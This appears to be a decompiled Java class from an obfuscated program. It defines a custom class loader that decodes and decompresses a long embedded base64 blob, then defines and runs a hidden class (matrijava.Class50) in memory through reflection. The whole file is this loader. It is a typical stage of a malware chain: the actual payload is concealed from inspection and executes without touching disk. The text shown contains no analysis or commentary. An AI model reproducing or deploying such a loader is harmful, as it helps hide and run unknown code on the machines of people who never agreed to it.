import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.zip.InflaterInputStream;
import javax.xml.bind.DatatypeConverter;
import matrijava.Class49;

public class Class49 extends ClassLoader {
  public Class49(ClassLoader paramClassLoader) {
    super(paramClassLoader);
  }
  
  public Class<?> loadClass(String paramString, byte[] paramArrayOfbyte) throws ClassNotFoundException {
    return defineClass(paramString, paramArrayOfbyte, 0, paramArrayOfbyte.length);
  }
  
  public static void run() throws Exception {
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.append("eNqNVuly2lgWPvISCCGd2HH29iRxbzY4FpvAtJNMs+8IIRsQmU0CYSSEJITENu8yf+fvdFWX7RrP9APMy8wLdM3MEXZ7iZ2qgap7rs495zvL1f2u/vWfv/8MACH4swu+gu9d8AL2HPDOBYvw3gkfbPlbJ/zghJgT4k5IOCFp61K2YdoFGci6");
    stringBuilder.append("IAd5BxQcUHTBCpRc8BDKDqBdsAbvbbOKPWNcUAXWftx3wIEdq2Y/zAPWnbDjgIYLXgHngKYLPsLvHPB7Au68k1TJ/EDAi82izI94UuHVQzKh8MNhUePborG3VSNgKaG1RQIeFCVVLFt9QTT2eUFBzV0FjebWBHx3FYE1DUk93PsY3/oUdo8A");
    stringBuilder.append("V2rSEnVT0tShA/6AKKx0qPKmZSCi5/9Deef5gECLhqXiuLlVc8AfMU1d0hFi5xxC0sicqlsmooh8f+9CSVvmpdYu7z5r8q1eidfnVTngTwQsW+pM0rE/mxj8Y/z26m5qbDQXq1lGS0xLdoPc82wp345t6oav4Rs38CAQ8PRT37glKdhv24Yk");
    stringBuilder.append("4CexrJsHlkmn/CmG7FFFMSIIFJurxen9gcnUFX6QqkmDGMNyk1qiKlFkRqGtcFvR2gEz4A/UMllfRd1NdnZjJZZtjGNBnyqrCV+hkB8N1bwyahokNbNmu95Kw6RDMb1SFqpdNkNzXLiaSXETXaJL/ExPWIVIIjPRrbAhpQNjPc/3ZD1TElNd");
    stringBuilder.append("echH1HypNWCamkrXhYY6c0ML2ph7kk73wof+ZIDKy6wm0If9RlEJhqP5crChKYycp2fhcq8S6UudgjWNpnK+RHIyanHRQqszNYrdOhdpU8VuZbdpyFagTgmFXiUUsmhqpvqn1eBkvyuFuplwpmHV1SIrRsPp1sCnN/qDLttvx9UwOWXFABPs");
    stringBuilder.append("1MlyqyAOzGyplYxNlFKBa+pNIZdpqd3cqNZMDUlVbLWCzQMu1MS0Y5FKLkPJyVxIiEe5oN5VyIrAUqrfLzbaM3EqUXWzz83IZlEcDylGDjJCf9iKjWuDfj7cE416VtjtKz2fyheV9IEZmdT93X6ADUxYsT0xshatNv1mNstK2FVrFG8VqKRg");
    stringBuilder.append("daNxpsbst+VGdGAw8jQaoqQEJQdq9cwkofraAUNNkCKvSmy4l6qF9r2ZhCQyTa+ea+RNpoNp7+en/fqgVPQVk7IY6Oi1nlwu1IJSTJfiZX/14GCWp+kS2cpnkrVBOX4w2M2P6aYaHoWEOhuJ+Kt8kEr6akZlpB6khwLDstZQ7Sa4wGF4muAG");
    stringBuilder.append("2OeqrzrkK+OKkNcYqqeNU1yVGUdrca3Ayrsy0w2N26EZQ8nZRH/c1mhfsZcoZ9W4N9kOSGkpFOowiWhwIh2UuEY00fVlmwkCKqNpwQrGqGl0XIoPhqUxne6XA5kSd5gLVSf5TCpg+GgqpQyKgYNyNxuSxsFMWgt5ZZWKBXxyLRaJ1mNNMhYM");
    stringBuilder.append("tvbr0vj9ewIe9nk8Sfa52olrpqn13SBCxw07EHHAoRu6IDlAdkMPFALezM+fZUoKiQcdiaKj8KZoXCEMAr78lTHiU1OMGQY/vbJsH9T5gAy0fsPwKse4wQ8BN2igO2DgBgOGbqAgTMDKRcLkOU24wQTLDZuwhWz7CeW5YQRjrPJSTQuy2DId");
    stringBuilder.append("MHHDFGYEPL6VwQl4/Ym+rJlpzVLbFzRMwKNLkyvaBZv57rXFDvL+Octv3crPudxtPH+H13VRRUZ4e4vTVvEzDIiOTlM7UxGwtnnTcO/XfK8zPF4AKDDcsk3aOfS9jfFxeWxIJnKzY3OeeO3cAeWz228Oe+meqV1sLgbanF8K88ZOyElfIQVJ");
    stringBuilder.append("bZNJ3uTNqS4mNHUkGqbd+xWdN4ZinB+K4VBcUnkDvZ/c1g4bb+1QNNnp0BT71/bv+ebWZy5nvDvRpSSaXQ3r/uG2vbmxL1exDLGj4CtEniEg3LPPreFuSupI62HfolfDnL2D18Kcq7ZuquANfot8BfbvDhD2bYjjt/i0AQv4R63HewzEjzjD");
    stringBuilder.append("GxdH11x7H5bhC9TgscAPozP7ZZzhuse7vbj98xEs/O3Cx0YG/ELy4LiEcy9s42wB3sJdpAISZzaChNK2o05hkTuGpYJndfkI7tQ9q44z4TwTd8+Eyxar9zxH4D6B+5cJboATx0c4rsEDeAxP8L8OT7G0Zxj4BX71vbxIxIcJIBOcJ8Cgbgnl");
    stringBuilder.append("y5Ul+Iez5Nk+gi+4D3+B+1jR+hE8+Ot///3jPG87zOrcdB1re4WVvUbgDQiixg0Lv8AdB4R+gUfEtUBIMOeB0ue92jiFh9wprHCeY1g9hkfFU1jDyh+XvNsn8ATDP73s4Vm8rzHWN1jItxj5u2voSKnn6A3EXkbp857AsxN4XjqFF9wJvDyG");
    stringBuilder.append("L8tv7aLWv196vrT6m8V/wqsjeE2gfHMEG/XLFj6Z+3uwhV5s5DY27C3u0s6VeATszjsR/R/hLfoG");
    run("matrijava.Class50", stringBuilder.toString());
  }
  
  public static void pipe(InputStream paramInputStream, OutputStream paramOutputStream) throws Exception {
    byte[] arrayOfByte = new byte[1024];
    int i;
    while ((i = paramInputStream.read(arrayOfByte)) > 0)
      paramOutputStream.write(arrayOfByte, 0, i); 
  }
  
  public static byte[] unzip(byte[] paramArrayOfbyte) throws Exception {
    InflaterInputStream inflaterInputStream = new InflaterInputStream(new ByteArrayInputStream(paramArrayOfbyte));
    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
    pipe(inflaterInputStream, byteArrayOutputStream);
    return byteArrayOutputStream.toByteArray();
  }
  
  public static void run(String paramString1, String paramString2) throws Exception {
    byte[] arrayOfByte = unzip(DatatypeConverter.parseBase64Binary(paramString2));
    Class49 class49 = new Class49(ClassLoader.getSystemClassLoader());
    Class<?> clazz = class49.loadClass(paramString1, arrayOfByte);
    clazz.getMethod("run", new Class[0]).invoke(null, new Object[0]);
  }
}
